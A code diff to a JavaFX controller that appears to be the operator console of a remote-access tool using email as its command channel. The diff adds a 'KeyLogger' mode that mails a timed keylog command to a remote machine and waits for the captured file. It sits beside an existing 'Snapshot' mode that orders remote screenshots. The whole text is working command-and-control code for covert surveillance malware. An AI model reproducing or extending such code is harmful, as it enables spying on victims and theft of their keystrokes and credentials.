@@ -35,9 +35,11 @@ public class sendMailController {
     @FXML
     public Label labelAddField;
 
+
     public void logText(String log, String color) {
         Text text = new Text(log);
         text.setStyle("-fx-fill: " + color);
+        text.wrappingWidthProperty().set(540);
         Platform.runLater(() -> {
             textOutputs.getChildren().add(text);
         });
@@ -55,9 +57,17 @@ public class sendMailController {
                         addField.setEditable(false);
                         labelAddField.setText("Not Available");
                         sendBut.setDisable(false);
-                    } else {
+                    }
+                    else if (t1.equals("KeyLogger")) {
+                        addField.setDisable(false);
+                        labelAddField.setText("Time to log in milliseconds");
+                        sendBut.setDisable(false);
+                        addField.setEditable(true);
+                    }
+                    else {
                         sendBut.setDisable(true);
                     }
+
 //                    if (t1.equals("KeyLogger")) {
 //                        addField.setEditable(true);
 //                        addField.setDisable(false);
@@ -82,6 +92,7 @@ public class sendMailController {
 
     public void sendButAction(ActionEvent actionEvent) {
         String choose = comboBox.getSelectionModel().getSelectedItem();
+        //snapshot task
         if (choose.equals("Snapshot")) {
             int id = random.nextInt(1000, 9999);
 
@@ -91,7 +102,7 @@ public class sendMailController {
                     System.out.println(Thread.currentThread().getName());
                     SendMail.getInstance().sendMail("req / " + id + " / " + "takeshot");
                     logText("ID: " + id + " Send Mail Successfully! Wait for response!", "green");
-                    String a = CheckMail.getInstance().listen(id);
+                    String a = CheckMail.getInstance().listen(id, 40);
                     if (a != null) {
                         logText("Get Response successfully. File in " + a, "green");
                         Platform.runLater(() -> {
@@ -108,6 +119,44 @@ public class sendMailController {
             thread.start();
 
 
+        }
+        //key log task
+        else if (choose.equals("KeyLogger")) {
+            try {
+                int time = Integer.parseInt(addField.getText());
+                if (time < 0) {
+                    throw new NumberFormatException();
+                } else if (time < 1000) {
+                    logText("Too small time to listen", "yellow");
+                } else {
+                    sendBut.setDisable(true);
+                    int id = random.nextInt(1000,9999);
+                    Thread thread = new Thread(() -> {
+                        try {
+                            System.out.println(Thread.currentThread().getName());
+                            SendMail.getInstance().sendMail("req / " + id + " / " + "keylog /" + time);
+                            logText("ID: " + id + " Send Mail Successfully! Wait for response!", "green");
+                            String a = CheckMail.getInstance().listen(id, 43 + time / 1000);
+                            if (a != null) {
+                                logText("Get Response successfully. File in " + a, "green");
+                                Platform.runLater(() -> {
+                                    sendBut.setDisable(false);
+                                });
+                            } else {
+                                logText("Error happens", "red");
+                            }
+                        } catch (IOException | MessagingException e) {
+                            logText(e.getMessage(), "red");
+                            e.printStackTrace();
+                        }
+                    });
+                    thread.start();
+                }
+
+            }
+            catch (NumberFormatException e) {
+                logText("Please enter an valid time!", "red");
+            }
         }
     }
 
